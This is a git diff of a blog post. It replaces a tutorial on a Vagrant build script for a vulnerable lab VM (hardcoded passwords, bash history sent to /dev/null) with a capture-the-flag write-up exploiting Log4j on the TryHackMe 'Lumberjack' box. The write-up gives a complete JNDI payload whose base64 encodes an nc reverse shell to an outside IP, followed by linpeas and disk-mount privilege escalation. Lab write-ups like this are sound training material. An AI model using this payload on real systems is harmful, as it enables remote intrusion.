@@ -1,131 +1,148 @@
 ---
-
 title: Writing Build script to setup our VM
-
-date: 2022-01-18 15:23:05 +0200
-
-categories: [Build vulnerable VMs,Build script]
-
+date: '2022-01-18 15:23:05 +0200'
+categories:
+  - Build vulnerable VMs
+  - Build script
 tags: vagrant VMs buildscript
-
+published: true
 ---
 
+
 ## Status
-- You can run `vagrant status` to check the status of your boxes
 
-![image](https://i.imgur.com/6OqzVDd.png)
+ Hello everyone this is my first ctf writeup. Name of the box is Lumberjack from tryhackme, it’s based on Log4j (CVE-2021-44228) it is a medium level challenge.
 
-- Let's start this with `vagrant up`
+Created by : SilverStr
 
-## Build script
-- Ok what is a build script?
-- **Build script** is used to setup the vulnerable VM
-- Like we can write set of commands in that file that need to setup the VM
+Let’s start with basic recons
 
-Ex: update, upgrade, installing required tools, setting up the firewall, chaning hostname, changing permissions of files, creating/deleting users, changing passwords for the users
-- Ok let's start
+Recon:
 
-```bash
-#!/bin/bash
-echo "[+] Building our first vulnerable VM"
-echo "[+] Getting update"
-sudo apt-get update
-```
-- First let's do an update
+nmap -sC -sV -Pn 10.10.120.161
 
+![image](https://i.imgur.com/kkQdBV9.png)
 
-```bash
-echo "[+] Installing utilities"
-apt install -y net-tools open-vm-tools
-```
-- Now let's install net tools and open vm tools (it's mandatory)
+Results from nmap showed 2 open ports
 
+In ssh there is nothing to see so went to check up the http port 80.
 
-```bash
-echo "[+] Configuring hostname"
-hostnamectl set-hostname pwn
-cat <<EOF > /etc/hosts
-127.0.0.1 localhost
-127.0.0.1 pwn
-EOF
-```
-- Changing the hostname of the machine
+\--------------------------------------------------------------------------------------------------------------------------------------
+## lets start
+![image](https://i.imgur.com/znguXwU.png)
 
+Nothing to see in this port. After that I used burp to capture the request of this site.
 
-```bash
-echo "[+] Checking users || Creating users"
-id -u pwn &>/dev/null || useradd -m pwn
-```
-- Checking if there's a user named pwn.
-#### breakdown that command
-```bash
-vagrant@ubuntu-focal:~$ id -u pwn &>/dev/null
-vagrant@ubuntu-focal:~$ echo $?
-1
-```
-- We can see the return value of a previous command by running `echo $?`
-- If the user exists then it'll return 0, Now there's no user  named **pwn**
-- So the command next to `||` (or operator) will run `useradd -m pwn`
+![image](https://i.imgur.com/VeMZtpN.png) 
 
+They give a resource to refer the log4j vulnerability. 
 
-```bash
-echo "[+] Symlinking history files to /dev/null"
-ln -sf /dev/null /root/.bash_history
-ln -sf /dev/null /home/pwn/.bash_history
-```
-- After adding the user, Now we are symlinking bash history files to `/dev/null`
+![image](https://i.imgur.com/uhrIwin.png)
+
+**References used to make this room:**
+
+- [Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
+- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
+- Malicious LDAP servers are fun. (Come on.... work for it a bit)
+
+I send the request to repeater and I used basic payload of log4j to manipulate the request via the user agent but I didn’t get any proper response. 
+
+![image](https://i.imgur.com/qjM9aJH.png)
+
+I saw the accept “request header” in burp .so, I decided to send the payload via the accept header.
+
+![image](https://i.imgur.com/Jnj3lL2.png)
+
+I got the proper response via this accept header.
+
+Let’s try to get shell using JNDIexploit...
+
+Java -jar JNDIExlpoit-1.2-SNAPSHOT.jar -u
+
+![image](https://i.imgur.com/uREj2Bv.png)
+
+I used this payload for the reverse shell via nc.
+
+Let’s set the exploit:
+
+![image](https://i.imgur.com/GrsdUPz.png)
+
+Reverse shell payload to base 64.
+
+${jndi:ldap://10.8.19.239:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjguMTkuMjM5IDQ0NDQgPi90bXAvZg==}
 
 
-```bash
-echo "[+] Setting passwords"
-echo "root:1hop3Y0uN3veRf1nD7h1sPaSsW0rDDDD" | chpasswd
-echo "pwn:w3lc0m379pWn&p41n" | chpasswd
-```
-- Setting a strong password for user and root
+![image](https://i.imgur.com/Cg2XA34.png)
+
+I send the payload via the accept header. 
+
+![image](https://i.imgur.com/37NrKQu.png)
+
+Finally, I got the shell. Let’s find the 1st flag;
+
+![image](https://i.imgur.com/ibUyBtP.png)
+
+It’s a docker environment... I go to the opt directory for flag’s 
 
 
-```bash
-echo "[+] Clean up"
-rm -rf /root/.cache
-rm -rf /home/pwn/.cache
-```
-- Deleting the cache files
-- Don't forget to delete your **setup.sh** (build script)
-- Coz it contains all information and passwords too
-- And delete other files your dropped in
+![image](https://i.imgur.com/lM2qnBa.png)
 
-### Full script
-```bash
-#!/bin/bash
-echo "[+] Building our first vulnerable VM"
-echo "[+] Getting update"
-sudo apt-get update
 
-echo "[+] Installing utilities"
-apt install -y net-tools open-vm-tools
 
-echo "[+] Configuring hostname"
-hostnamectl set-hostname pwn
-cat <<EOF > /etc/hosts
-127.0.0.1 localhost
-127.0.0.1 pwn
-EOF
+I got the 1st flag …
 
-echo "[+] Checking users || Creating users"
-id -u pwn &>/dev/null || useradd -m pwn
+cat .flag1 
 
-echo "[+] Symlinking history files to /dev/null"
-ln -sf /dev/null /root/.bash_history
-ln -sf /dev/null /home/pwn/.bash_history
+Let’s check for 2nd flag, after long time I decide to use linpease to know vulnerabilities.
 
-echo "[+] Setting passwords"
-echo "root:1hop3Y0uN3veRf1nD7h1sPaSsW0rDDDD" | chpasswd
-echo "pwn:w3lc0m379pWn&p41n" | chpasswd
+I will set the python server to get the linpeas from my machine to that vuln machine.
 
-echo "[+] Clean up"
-rm -rf /root/.cache
-rm -rf /home/pwn/.cache
-```
-- Now we can run this script in our VM to setup it :D
-- So this is called a build script.
-- Let's create our first vulnerable VM in next article :)
+![image](https://i.imgur.com/898sjck.png)
+
+Let’s give the execute permission to the linpeas chmod +x linpeas.sh and run the linpeas
+
+I saw the suid unmount in the bin directory..
+
+![image](https://i.imgur.com/ZIYlfIi.png)
+
+Let’s see what is in dev directory, I found some directories which is unmounted on disk.
+
+![image](https://i.imgur.com/Ux2QzX9.png)  
+
+Make the empty directory in the tmp directory ‘123’ to mount it. 
+
+![image](https://i.imgur.com/44fEVXe.png)
+
+After that I will go to the root directory which is on mounted folder ‘123’
+
+![image](https://i.imgur.com/CWwj8DS.png)
+
+
+
+
+
+
+On the root directory I saw the root.txt, but here I got depressed. 
+
+![image](https://i.imgur.com/44YLZZF.png) 
+
+After few moments I saw the directory which is ‘…’ 
+
+cd …;ls -la
+
+cat .\_fLaG2
+
+![image](https://i.imgur.com/cyDyJ8y.png)
+
+At last, I found the final flag. A wonderful medium level ctf to know what is log4j and how its working
+
+
+
+
+
+`                          `……….….…………….Happy learning & Hunting ………………………
+
+
+
+
